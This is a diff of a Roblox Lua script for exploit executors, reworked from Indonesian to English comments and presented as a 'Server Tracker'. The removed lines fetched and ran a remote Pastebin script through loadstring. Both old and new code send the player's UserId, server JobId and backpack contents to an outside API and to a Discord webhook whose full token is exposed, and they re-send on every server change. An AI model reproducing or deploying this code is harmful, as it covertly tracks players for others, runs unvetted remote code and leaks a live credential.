@@ -4,61 +4,51 @@ local Players = game:GetService("Players")
 -- ======= CONFIGURATION =======
 local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF" -- Script yang akan di-execute
 -- =============================
 
--- Variables
 local player = Players.LocalPlayer
 local currentJobId = game.JobId
 local playerName = player.Name
-local isFirstRun = true
 
--- Fungsi HTTP request yang kompatibel dengan berbagai executor
-local function httpRequest(url, method, body, headers)
+-- Improved HTTP request with retry logic
+local function httpRequest(url, method, body, headers, retries)
+    retries = retries or 3
     local requestFunc = syn and syn.request or http_request or request
     if not requestFunc then return nil end
     
-    local success, response = pcall(function()
-        return requestFunc({
-            Url = url,
-            Method = method,
-            Headers = headers or {
-                ["Content-Type"] = "application/json"
-            },
-            Body = body
-        })
-    end)
-    
-    return success and response or nil
+    for i = 1, retries do
+        local success, response = pcall(function()
+            return requestFunc({
+                Url = url,
+                Method = method,
+                Headers = headers or {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = body
+            })
+        end)
+        
+        if success and response then
+            return response
+        end
+        wait(1) -- Wait before retrying
+    end
+    return nil
 end
 
--- Fungsi untuk mendapatkan isi backpack
 local function getBackpackContents()
     local contents = {}
     local backpack = player:FindFirstChild("Backpack")
-    if not backpack then return "Backpack tidak ditemukan" end
+    if not backpack then return "Backpack not found" end
     
     for _, item in ipairs(backpack:GetChildren()) do
         table.insert(contents, item.Name)
     end
     
-    return #contents > 0 and table.concat(contents, ", ") or "Backpack kosong"
+    return #contents > 0 and table.concat(contents, ", ") or "Backpack empty"
 end
 
--- Fungsi untuk execute external script
-local function executeExternalScript()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
-    end)
-    if not success then
-        warn("Gagal execute external script:", err)
-        return false
-    end
-    return true
-end
-
--- Kirim data ke API
-local function sendToAPI()
+local function updateInstanceInDatabase()
     local data = {
         instanceId = currentJobId,
         player = {
@@ -66,103 +56,96 @@ local function sendToAPI()
             name = player.Name,
             accountAge = player.AccountAge
         },
-        backpackContents = getBackpackContents(),
-        timestamp = os.time(),
-        isServerChange = not isFirstRun
+        timestamp = os.time()
     }
     
     local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
     
     if response and response.StatusCode == 200 then
-        print("✅ Data berhasil dikirim ke API")
+        print("✅ Successfully updated instance ID in database:", currentJobId)
         return true
     else
-        warn("❌ Gagal mengirim data ke API:", response and response.StatusCode or "Tidak ada response")
+        warn("❌ Failed to update instance ID:", response and response.StatusCode or "No response")
         return false
     end
 end
 
--- Kirim webhook ke Discord
-local function sendWebhook()
+local function sendServerChangeNotification()
     local embed = {
-        username = "Logger System",
+        username = "Server Tracker",
         embeds = {
             {
-                title = isFirstRun and "🟢 Script Dijalankan" or "🔄 Server Berubah",
-                description = string.format("**%s** %s\n**JobID:** `%s`", 
-                    playerName, 
-                    isFirstRun and "menjalankan script" or "pindah server", 
-                    currentJobId),
-                color = isFirstRun and 65280 or 16776960, -- Hijau untuk pertama kali, kuning untuk server change
+                title = "🔄 Server Change Detected",
+                description = string.format("**%s** changed servers\n**New JobID:** `%s`", playerName, currentJobId),
+                color = 16776960, -- Yellow
                 timestamp = DateTime.now():ToIsoDate(),
                 fields = {
                     {
-                        name = "🎒 Isi Backpack",
-                        value = getBackpackContents(),
-                        inline = false
-                    },
-                    {
-                        name = "👤 Info Player",
-                        value = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
+                        name = "👤 Player Info",
+                        value = string.format("UserID: %d", player.UserId),
                         inline = true
                     },
                     {
-                        name = "🌐 Server Status",
-                        value = isFirstRun and "Join Pertama" or "Pindah Server",
+                        name = "📦 Backpack",
+                        value = getBackpackContents(),
                         inline = true
                     }
                 },
                 footer = {
-                    text = "Logger v2.0 | Auto Server Tracker"
+                    text = "Auto Server Tracker v3.1"
                 }
             }
         }
     }
     
-    local response = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
+    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
+end
+
+-- Main function to handle server joins/changes
+local function handleServerJoin()
+    -- Update the instance ID in database (with retry logic)
+    local attempts = 0
+    local maxAttempts = 3
+    local success = false
     
-    if response and (response.StatusCode == 200 or response.StatusCode == 204) then
-        print("✅ Webhook berhasil dikirim ke Discord")
+    while attempts < maxAttempts and not success do
+        attempts += 1
+        success = updateInstanceInDatabase()
+        if not success then
+            wait(2) -- Wait before retrying
+        end
+    end
+    
+    -- Send notification if successful
+    if success then
+        sendServerChangeNotification()
     else
-        warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "Tidak ada response")
+        warn("❌ All attempts to update instance ID failed")
     end
 end
 
--- Fungsi utama yang dijalankan ketika join server
-local function main()
-    -- Execute external script terlebih dahulu
-    local scriptSuccess = executeExternalScript()
+-- Server change detection system
+local function monitorServerChanges()
+    local lastJobId = currentJobId
     
-    -- Jika script berhasil dijalankan, kirim data ke API dan webhook
-    if scriptSuccess then
-        sendToAPI()
-        sendWebhook()
-    else
-        warn("❌ External script gagal dijalankan, proses pengiriman data dibatalkan")
-    end
-    
-    isFirstRun = false
-end
-
--- Deteksi perubahan server
-local function trackServerChanges()
     while true do
         local newJobId = game.JobId
-        if newJobId ~= currentJobId then
-            print("⚠️ Deteksi perubahan server:", currentJobId, "->", newJobId)
+        if newJobId ~= lastJobId then
+            print("🔄 Detected server change:", lastJobId, "→", newJobId)
             currentJobId = newJobId
-            main() -- Jalankan lagi ketika pindah server
+            lastJobId = newJobId
+            handleServerJoin() -- Process the server change
         end
-        wait(5) -- Check setiap 5 detik
+        wait(1) -- Check every second
     end
 end
 
--- Jalankan dengan error handling
+-- Initial execution
 local success, err = pcall(function()
-    main() -- Jalankan pertama kali
-    trackServerChanges() -- Mulai tracking perubahan server
+    handleServerJoin() -- Run for initial join
+    monitorServerChanges() -- Start monitoring for changes
 end)
 
 if not success then
-    warn("❌ Error fatal pada logger:", err)
+    warn("❌ Critical error in server tracker:", err)
 end
